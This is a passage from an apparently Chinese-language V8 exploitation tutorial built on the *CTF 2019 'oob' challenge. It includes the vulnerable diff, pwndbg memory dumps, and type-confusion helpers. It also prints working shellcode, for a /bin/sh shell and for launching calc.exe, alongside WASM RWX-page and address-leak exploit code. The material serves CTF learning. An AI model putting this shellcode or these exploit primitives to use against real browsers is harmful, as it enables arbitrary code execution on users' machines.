class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br></pre></td></tr></table></figure><p>其中 <code>arbitrary_address_read</code> 函数的具体实现方式要看具体的漏洞环境  </p><h2 id="常用shellcode"><a href="#常用shellcode" class="headerlink" title="常用shellcode"></a>常用shellcode</h2><p>在 <code>CTF</code> 题目中，我们的目的大多数是 <code>getshell</code> 然后获取 <code>flag</code>，用于 <code>getshell</code> 的 <code>shellcode</code> 如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">    <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">    <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>当然我们也可以令其弹计算器，<code>shellcode</code> 如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0xc0e8f0e48348fcn</span>,</span><br><span class="line">    <span class="number">0x5152504151410000n</span>,</span><br><span class="line">    <span class="number">0x528b4865d2314856n</span>,</span><br><span class="line">    <span class="number">0x528b4818528b4860n</span>,</span><br><span class="line">    <span class="number">0xb70f4850728b4820n</span>,</span><br><span class="line">    <span class="number">0xc03148c9314d4a4an</span>,</span><br><span class="line">    <span class="number">0x41202c027c613cacn</span>,</span><br><span class="line">    <span class="number">0xede2c101410dc9c1n</span>,</span><br><span class="line">    <span class="number">0x8b20528b48514152n</span>,</span><br><span class="line">    <span class="number">0x88808bd001483c42n</span>,</span><br><span class="line">    <span class="number">0x6774c08548000000n</span>,</span><br><span class="line">    <span class="number">0x4418488b50d00148n</span>,</span><br><span class="line">    <span class="number">0x56e3d0014920408bn</span>,</span><br><span class="line">    <span class="number">0x4888348b41c9ff48n</span>,</span><br><span class="line">    <span class="number">0xc03148c9314dd601n</span>,</span><br><span class="line">    <span class="number">0xc101410dc9c141acn</span>,</span><br><span class="line">    <span class="number">0x244c034cf175e038n</span>,</span><br><span class="line">    <span class="number">0x4458d875d1394508n</span>,</span><br><span class="line">    <span class="number">0x4166d0014924408bn</span>,</span><br><span class="line">    <span class="number">0x491c408b44480c8bn</span>,</span><br><span class="line">    <span class="number">0x14888048b41d001n</span>,</span><br><span class="line">    <span class="number">0x5a595e58415841d0n</span>,</span><br><span class="line">    <span class="number">0x83485a4159415841n</span>,</span><br><span class="line">    <span class="number">0x4158e0ff524120ecn</span>,</span><br><span class="line">    <span class="number">0xff57e9128b485a59n</span>,</span><br><span class="line">    <span class="number">0x1ba485dffffn</span>,</span><br><span class="line">    <span class="number">0x8d8d480000000000n</span>,</span><br><span class="line">    <span class="number">0x8b31ba4100000101n</span>,</span><br><span class="line">    <span class="number">0xa2b5f0bbd5ff876fn</span>,</span><br><span class="line">    <span class="number">0xff9dbd95a6ba4156n</span>,</span><br><span class="line">    <span class="number">0x7c063c28c48348d5n</span>,</span><br><span class="line">    <span class="number">0x47bb0575e0fb800an</span>,</span><br><span class="line">    <span class="number">0x894159006a6f7213n</span>,</span><br><span class="line">    <span class="number">0x2e636c6163d5ffdan</span>,</span><br><span class="line">    <span class="number">0x657865n</span>,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h2 id="类型混淆利用模板"><a href="#类型混淆利用模板" class="headerlink" title="类型混淆利用模板"></a>类型混淆利用模板</h2><p>这里先给出一些方便类型混淆漏洞利用的模板，在后面编写 <code>exp</code> 时会用上  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="漏洞利用实战"><a href="#漏洞利用实战" class="headerlink" title="漏洞利用实战"></a>漏洞利用实战</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>和文章一开始说的一样，环境用的是 <code>*CTF 2019</code> 的 <code>oob</code>。题目给了一个 <code>diff</code> 文件：  </p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line"><span class="comment">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">index 0447230..f113a81 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-definitions.h</span></span><br><span class="line"><span class="meta">@@ -368,6 +368,7 @@</span> namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line"><span class="addition">+  CPP(ArrayOob)                                                                \</span></span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line"><span class="comment">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">index ed1e4a5..c199e3a 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/typer.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/typer.cc</span></span><br><span class="line"><span class="meta">@@ -1680,6 +1680,8 @@</span> Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line"><span class="addition">+    case Builtins::kArrayOob:</span></span><br><span class="line"><span class="addition">+      return Type::Receiver();</span></span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure><p>嗯。。。。。。，好像看的不太懂，这里简单解释一下<br>这里主要是出题人为 <code>array</code> 定义了一个 <code>oob</code> 函数，其函数的功能如下：  </p><ul><li>获取参数的数量，然后根据参数个数进行不同的操作  </li><li>如果参数数量大于 <code>2</code> 则直接抛出 <code>undefined</code>  </li><li>如果参数数量小于等于 <code>2</code>，则先把 <code>array</code> 转成 <code>doublearray</code>  </li><li>然后判断如果无额外参数（第一个是 <code>this</code>），则是 <code>read</code> 功能，返回 <code>array[length]</code>  </li><li>如果传入了一个参数，则是 <code>write</code> 功能，将 <code>value</code> 写入到 <code>doublearray[length]</code> 中</li></ul><p>这里的漏洞还是挺好发现了，我们知道 <code>array</code> 最后一个元素的索引为 <code>length - 1</code>， 而这里可以索引到 <code>length</code>，也就是说我们可以在 <code>elements</code> 中越界读和写一个索引的数据<br>在上面的分析中我们知道 <code>elements</code> 是在 <code>obj</code> 的上方的，当时我也说过 <code>elements</code> 并不一定紧贴着 <code>obj</code> 的，现在我就来分析一下这个问题。<code>demo</code> 代码如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>结果如下：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x20bd84310ab9 &lt;JSArray[4]&gt;  </span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x20bd84310ab9</span><br><span class="line">0x20bd84310ab9: [JSArray]</span><br><span class="line"> - map: 0x273506142d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x02e1c7e51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x20bd84310a41 &lt;FixedArray[4]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x10c0b3540c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x15d18a8001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x20bd84310a41 &lt;FixedArray[4]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 4</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tel 0x20bd84310a41</span><br><span class="line">00:0000│  0x20bd84310a41 ◂— 0x10c0b35408</span><br><span class="line">01:0008│  0x20bd84310a49 ◂— 0x4000000</span><br><span class="line">02:0010│  0x20bd84310a51 ◂— 0x1000000</span><br><span class="line">03:0018│  0x20bd84310a59 ◂— 0x2000000</span><br><span class="line">04:0020│  0x20bd84310a61 ◂— 0x3000000</span><br><span class="line">05:0028│  0x20bd84310a69 ◂— 0x5100000004000000</span><br><span class="line">06:0030│  0x20bd84310a71 ◂— 0x10c0b35408</span><br><span class="line">07:0038│  0x20bd84310a79 ◂— 0x2900000004000000</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>怪，可以看见在 <code>elements</code> 到 <code>obj</code> 的中间存在一些数据，于是我好奇去看看这是什么东西  </p><img src="/2024/05/05/v8start/8.png" class="" title="我的图图呢">  <p>好家伙，居然还会存在一个别的结构。算了，这不是我这个初学者该了解的东西，等学深入了再研究吧，暂时不影响解题<br>既然全为整数的 <code>array</code> 的 <code>elements</code> 无法紧贴着 <code>obj</code>，那存在浮点数的 <code>array</code> 呢？<code>demo</code> 代码如下：  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>运行结果如下：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x116059b90b21 &lt;JSArray[4]&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x116059b90b21</span><br><span class="line">0x116059b90b21: [JSArray]</span><br><span class="line"> - map: 0x0ce399302ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x07fe97a11111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x116059b90af1 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x3ffe4d400c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x062d803001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x116059b90af1 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 4</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt; tel 0x116059b90af1</span><br><span class="line">00:0000│  0x116059b90af1 ◂— 0x3ffe4d4014</span><br><span class="line">01:0008│  0x116059b90af9 ◂— 0x9a00000004000000</span><br><span class="line">02:0010│  0x116059b90b01 ◂— 0x9a3ff19999999999</span><br><span class="line">03:0018│  0x116059b90b09 ◂— 0x40019999999999</span><br><span class="line">04:0020│  0x116059b90b11 ◂— 0x40080000000000</span><br><span class="line">05:0028│  0x116059b90b19 ◂— 0xd940100000000000</span><br><span class="line">06:0030│  0x116059b90b21 ◂— 0x7100000ce399302e</span><br><span class="line">07:0038│  0x116059b90b29 ◂— 0xf100003ffe4d400c</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>可以看见带浮点数数组的 <code>elements</code> 是紧贴着 <code>obj</code> 的，这符合我们漏洞的利用<br>首先尝试利用一下能否利用该漏洞来泄露出 <code>obj</code> 中 <code>map</code> 的值  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(float_array);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure><p>结果如下：  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="built_in">float</span> array map: 0x000029e6d51c2ed9</span><br><span class="line">0x133632fd10b1 &lt;JSArray[1]&gt;  </span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x133632fd10b1</span><br><span class="line">0x133632fd10b1: [JSArray]</span><br><span class="line"> - map: 0x29e6d51c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1dc4905d1111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x133632fd1099 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x097d61840c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x3faa656801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x133632fd1099 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 0.1</span><br><span class="line"> &#125;</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>可以看到我们已经成功的泄露出了 <code>map</code>。同理，我们也可以用类似的方法去修改 <code>map</code><br>为了能够在 <code>WASM</code> 上写入我们的 <code>shellcode</code>，我们需要任意地址写和地址泄露，这时候就需要用到类型混淆  </p><h2 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h2><p>在上面已经说过，<code>v8</code> 是通过 <code>map</code> 所指向的区域来判断该对象是什么类型，也就是说，如果我们吧一个存储 <code>obj</code> 的 <code>array</code> 的 <code>map</code> 修改为存在浮点数数组的 <code>map</code>，这时候我们就能够直接获取到该对象的地址。我们可以将该原语封装成一个 <code>addressOf</code> 函数  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title 